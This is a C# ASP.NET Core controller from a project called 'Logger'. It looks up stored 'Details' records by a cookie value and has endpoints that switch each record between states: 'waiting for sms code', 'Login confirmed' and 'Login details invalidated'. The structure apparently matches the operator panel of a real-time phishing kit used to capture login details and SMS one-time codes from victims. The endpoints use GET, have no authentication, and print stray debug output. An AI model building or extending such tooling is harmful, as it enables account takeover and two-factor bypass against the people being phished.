using Logger.Data;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;

namespace Logger.Controllers
{
    public class StatusController : Controller
    {
        private readonly ApplicationDbContext _context;

        public StatusController(ApplicationDbContext context)
        {
            _context = context;
            
        }

        public async Task<IActionResult> Index([FromQuery] string user)
        {
            var details = await _context.Details.Where(details => details.Cookie == user).FirstOrDefaultAsync();
            if (details != null)
            {
                return Ok(details);
            }
            Console.WriteLine("Yess");
            return NotFound();
        }

        [HttpGet]
        public async Task<IActionResult> GetSms([FromQuery] string user)
        {
            var details = await _context.Details.Where(details => details.Cookie == user).FirstOrDefaultAsync();
            if (details != null)
            {
                details.GetSms = true;
                details.Confirmed = false;
                details.Invalid = false;
                _context.Update(details);
                await _context.SaveChangesAsync();
                return Ok(new
                {
                    user = details.Cookie, sms = "waiting for sms code"
                });
            }
            Console.WriteLine("Yess");
            return NotFound();
        }

        [HttpGet]
        public async Task<IActionResult> Confirm([FromQuery] string user)
        {
            var details = await _context.Details.Where(details => details.Cookie == user).FirstOrDefaultAsync();
            if (details != null)
            {
                details.Confirmed = true;
                details.GetSms = false;
                details.Invalid = false;
                _context.Update(details);
                await _context.SaveChangesAsync();
                return Ok(new
                {
                    user = details.Cookie,
                    sms = "Login confirmed"
                });
            }
            return NotFound();
        }

        [HttpGet]
        public async Task<IActionResult> Invalid([FromQuery] string user)
        {
            var details = await _context.Details.Where(details => details.Cookie == user).FirstOrDefaultAsync();
            if (details != null)
            {
               details.Invalid = true;
                details.GetSms = false;
                details.Confirmed = false;
                _context.Update(details);
                await _context.SaveChangesAsync();
                return Ok(new
                {
                    user = details.Cookie,
                    sms = "Login details invalidated"
                });
            }
            return NotFound();
        }
    }
}
